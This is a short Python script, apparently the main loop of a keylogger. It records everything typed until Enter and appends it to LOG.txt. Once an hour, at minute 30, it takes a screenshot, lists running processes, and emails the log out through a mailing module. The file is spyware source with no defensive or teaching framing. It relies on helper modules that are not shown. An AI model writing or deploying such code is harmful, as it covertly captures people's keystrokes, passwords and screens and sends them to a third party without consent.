import datetime
import keyboard
import file_handler
import mailing_api
import process_handler
from etc import time

if __name__ == "__main__":

     print('start')
     while 1:
         status = time.localtime()
         recorded = keyboard.record(until='enter')
         typedstr = " ".join(keyboard.get_typed_strings(recorded))
         file_handler.file_input(recorded)
         file_handler.file_write(typedstr)

         f = open("LOG.txt", 'r')
         file_content = f.read()
         f.close()
         now = datetime.datetime.now()
         nowtime = now.strftime('%M')

         with open('LOG.txt') as f:
             # len(f.readlines())
             count = (sum(1 for _ in f))
             print ('count:', count)

         if (nowtime == '30'):
            file_handler.screenShot()
            process_handler.parse_process_list()
            mailing_api.send_simple_message(file_content)
            mailing_api.send_LOG()
            print("done")
            file_handler.file_flush()